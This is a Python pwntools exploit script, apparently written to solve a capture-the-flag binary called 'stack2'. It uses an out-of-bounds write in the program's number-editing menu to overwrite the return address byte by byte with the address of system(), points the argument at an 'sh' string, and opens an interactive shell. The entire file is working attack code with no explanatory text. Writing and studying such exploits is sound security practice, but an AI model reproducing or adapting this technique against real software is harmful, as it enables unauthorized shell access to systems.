#!/usr/bin/env python
from pwn import *
import ctypes
p = process('./stack2')
context.log_level = 'debug'

def change(index, content):
	p.sendlineafter('5. exit\n', '3')
	p.sendlineafter('which number to change:\n', str(index))
	p.sendlineafter('new number:\n', str(content))

p.sendlineafter('How many numbers you have:\n', '1')
p.sendlineafter('Give me your numbers\n', '1')
hack_addr = 0x0804859b
sys_addr = 0x08048450
offset = 132
# gdb.attach(p, 'b *0x0804859b')
# overflow ret
for i in range(4):
	byte = (sys_addr >> (i * 8)) & 0xff
	byte = str(ctypes.c_int8(byte))
	start = byte.find('(') + 1
	end = byte.find(')')
	byte = int(byte[start:end])
	change(offset + i, byte)
str_addr = 0x08048987
offset2 = offset + 8
# point to string 'sh'
for i in range(4):
	byte = (str_addr >> (i * 8)) & 0xff
	byte = str(ctypes.c_int8(byte))
	start = byte.find('(') + 1
	end = byte.find(')')
	byte = int(byte[start:end])
	change(offset2 + i, byte)
p.sendlineafter('5. exit\n', '5')
p.interactive()
